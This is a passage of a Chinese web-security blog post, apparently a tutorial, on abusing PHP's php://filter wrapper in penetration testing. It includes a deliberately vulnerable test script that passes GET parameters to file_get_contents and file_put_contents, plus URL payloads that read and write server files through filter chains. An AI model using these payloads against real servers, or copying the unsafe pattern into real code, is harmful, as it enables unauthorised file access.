@@ -1,0 +1,1521 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="探索php://filter在实战当中的奇技淫巧, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>探索php://filter在实战当中的奇技淫巧 | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">探索php://filter在实战当中的奇技淫巧</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PHP/">
+                                <span class="chip bg-color">PHP</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                Web安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2020-04-03
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    9.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    38 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透测试或漏洞挖掘的过程中，我们经常会遇到<code>php://filter</code>结合其它漏洞比如文件包含、文件读取、反序列化、XXE等进行组合利用，以达到一定的攻击效果，拿到相应的服务器权限。</p>
+<p>最近看到<code>php://filter</code>在ThinkPHP反序列化中频繁出现利用其相应构造可以RCE，那么下面就来探索一下关于<code>php://filter</code>在漏洞挖掘中的一些奇技淫巧。</p>
+<h1 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h1><p>在探索php://filter在实战当中的奇技淫巧时，一定要先了解关于php://filter的原理和利用。</p>
+<p>对于PHP官方手册介绍如下</p>
+<blockquote>
+<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 </p>
+<p>php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。 </p>
+</blockquote>
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><img src="/2020/04/03/php-filter-tricks/1594459-20200403111710675-237604295.png" alt></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>通过参数去了解php://filter的使用</p>
+<ul>
+<li>测试代码</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file2</span><span class="token punctuation">,</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>读取文件</li>
+</ul>
+<p>payload：</p>
+<pre><code># 明文读取
+index.php?file1=php://filter/resource=file.txt
+
+# 编码读取
+index.php?file1=php://filter/read=convert.base64-encode/resource=file.txt</code></pre><p>测试结果：</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403114844148-536963951.png" alt></p>
+<ul>
+<li>写入文件</li>
+</ul>
+<p>payload：</p>
+<pre><code># 明文写入
+index.php?file2=php://filter/resource=test.txt&amp;txt=Qftm
+
+# 编码写入
+index.php?file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=Qftm</code></pre><p>测试结果：</p>
+<p><img src="/2020/04/03/php-filter-tricks/1594459-20200403120409319-1667411204.png" alt></p>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>通过参考<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">官方过滤器</a>的解释，进行一个简单的描述总结（版本、以及使用的介绍）</p>
+<h3 id="String-Filters"><a href="#String-Filters" class="headerlink" title="String Filters"></a>String Filters</h3><p>String Filters（字符串过滤器）每个过滤器都正如其名字暗示的那样工作并与内置的 PHP 字符串函数的行为相对应。</p>
+<h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>（自 PHP 4.3.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.str-rot13.php" target="_blank" rel="noopener">str_rot13()</a>函数处理所有的流数据。</p>
+<p><code>string.rot13</code>对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p>
+<ul>
+<li>Example #1 string.rot13</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'string.rot13'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  Guvf vf n grfg.   */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="string-toupper"><a href="#string-toupper" class="headerlink" title="string.toupper"></a>string.toupper</h4><p>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtoupper.php" target="_blank" rel="noopener">strtoupper()</a>函数处理所有的流数据。</p>
+<p>string.toupper 将字符串转化为大写</p>
+<ul>
+<li>Example #2 string.toupper</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'string.toupper'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  THIS IS A TEST.   */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="string-tolower"><a href="#string-tolower" class="headerlink" title="string.tolower"></a>string.tolower</h4><p>（自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php" target="_blank" rel="noopener">strtolower()</a>函数处理所有的流数据。</p>
+<p>string.toupper 将字符串转化为小写</p>
+<ul>
+<li>Example #3 string.tolower</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'string.tolower'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  this is a test.   */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h4><p>(PHP 4, PHP 5, PHP 7)（自PHP 7.3.0起已弃用此功能。）</p>
+<p>使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener">strip_tags()</a>函数处理所有的流数据。可以用两种格式接收参数：一种是和 <a href="https://www.php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener">strip_tags()</a>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p>
+<p>string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 <code>str</code> 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 <a href="https://www.php.net/manual/zh/function.fgetss.php" target="_blank" rel="noopener">fgetss()</a> 一样的机制去除标记。</p>
+<pre><code>Note:
+
+HTML 注释和 PHP 标签也会被去除。这里是硬编码处理的，所以无法通过 allowable_tags 参数进行改变。</code></pre><ul>
+<li>Example #4 string.strip_tags</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'string.strip_tags'</span><span class="token punctuation">,</span> <span class="token constant">STREAM_FILTER_WRITE</span><span class="token punctuation">,</span> <span class="token string">"&lt;b>&lt;i>&lt;u>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"&lt;b>bolded text&lt;/b> enlarged to a &lt;h1>level 1 heading&lt;/h1>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  &lt;b>bolded text&lt;/b> enlarged to a level 1 heading   */</span>
+
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'string.strip_tags'</span><span class="token punctuation">,</span> <span class="token constant">STREAM_FILTER_WRITE</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"&lt;b>bolded text&lt;/b> enlarged to a &lt;h1>level 1 heading&lt;/h1>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  &lt;b>bolded text&lt;/b> enlarged to a level 1 heading   */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Conversion-Filters"><a href="#Conversion-Filters" class="headerlink" title="Conversion Filters"></a>Conversion Filters</h3><p>Conversion Filters（转换过滤器）如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。</p>
+<h4 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h4><p>convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 <a href="https://www.php.net/manual/zh/function.base64-encode.php" target="_blank" rel="noopener">base64_encode()</a>和 <a href="https://www.php.net/manual/zh/function.base64-decode.php" target="_blank" rel="noopener">base64_decode()</a>函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了 <code>line-length</code>，base64 输出将被用 <code>line-length</code>个字符为 长度而截成块。如果给出了 <code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用 <a href="https://www.php.net/manual/zh/function.base64-encode.php" target="_blank" rel="noopener">base64_encode()</a>再加上 <a href="https://www.php.net/manual/zh/function.chunk-split.php" target="_blank" rel="noopener">chunk_split()</a>相同。</p>
+<ul>
+<li>Example #1 convert.base64-encode &amp; convert.base64-decode</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'convert.base64-encode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  VGhpcyBpcyBhIHRlc3QuCg==  */</span>
+
+<span class="token variable">$param</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'line-length'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'line-break-chars'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'convert.base64-encode'</span><span class="token punctuation">,</span> <span class="token constant">STREAM_FILTER_WRITE</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  VGhpcyBp
+          :  cyBhIHRl
+          :  c3QuCg==  */</span>
+
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'convert.base64-decode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"VGhpcyBpcyBhIHRlc3QuCg=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  This is a test.  */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h4><p><em>convert.quoted-printable-encode</em>和 <em>convert.quoted-printable-decode</em>使用此过滤器的 decode 版本等同于用 <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php" target="_blank" rel="noopener">quoted_printable_decode()</a>函数处理所有的流数据。没有和 <em>convert.quoted-printable-encode</em>相对应的函数。 <em>convert.quoted-printable-encode</em>支持以一个关联数组给出的参数。除了支持和 <em>convert.base64-encode</em>一样的附加参数外， <em>convert.quoted-printable-encode</em>还支持布尔参数 <code>binary</code>和 <code>force-encode-first</code>。 <em>convert.base64-decode</em>只支持 <code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p>
+<ul>
+<li>Example #2 convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>
+</ul>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//output', 'w');</span>
+<span class="token function">stream_filter_append</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">'convert.quoted-printable-encode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">/* Outputs:  =This is a test.=0A  */</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><p>这个过滤器需要 php 支持 <code>iconv</code>，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用<a href="https://www.php.net/manual/zh/function.iconv.php" target="_blank" rel="noopener">iconv()</a>函数处理所有的流数据。</p>
+<pre><code>Note 该过滤在PHP中文手册里面没有标注，可查看英文手册
+
+https://www.php.net/manual/en/filters.convert.php</code></pre><p><code>convery.iconv.*</code>的使用有两种方法</p>
+<pre><code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 
+or 
+convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code></pre><ul>
+<li>iconv()</li>
+</ul>
+<p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)</p>
+<p>iconv — 字符串按要求的字符编码来转换</p>
+<p>说明</p>
+<pre><code>iconv ( string $in_charset , string $out_charset , string $str ) : string</code></pre><p>将字符串 <code>str</code> 从 <code>in_charset</code> 转换编码到 <code>out_charset</code>。</p>
+<p>参数</p>
+<pre><code>in_charset
+
+  输入的字符集。
+
+out_charset
+
+  输出的字符集。如果你在 out_charset 后添加了字符串 //TRANSLIT，将启用转写（transliteration）功能。这个意思是，当一个字符不能被目标字符集所表示时，它可以通过一个或多个形似的字符来近似表达。 如果你添加了字符串 //IGNORE，不能以目标字符集表达的字符将被默默丢弃。 否则，会导致一个 E_NOTICE并返回 FALSE。
+
+str
+    要转换的字符串。</code></pre><p>返回值</p>
+<pre><code>返回转换后的字符串， 或者在失败时返回 **`FALSE`**。</code></pre><p><img src="/2020/04/03/php-filter-tricks/1594459-20200403162957122-1940647628.png" alt></p>
+<p>Example #1 iconv()</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string">"This is the Euro symbol '€'."</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token string">'Original : '</span><span class="token punctuation">,</span> <span class="token variable">$text</span><span class="token punctuation">,</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">'TRANSLIT : '</span><span class="token punctuation">,</span> <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">,</span> "<span class="token constant">ISO</span><span class="token number">-8859</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">//TRANSLIT", $text), PHP_EOL;</span>
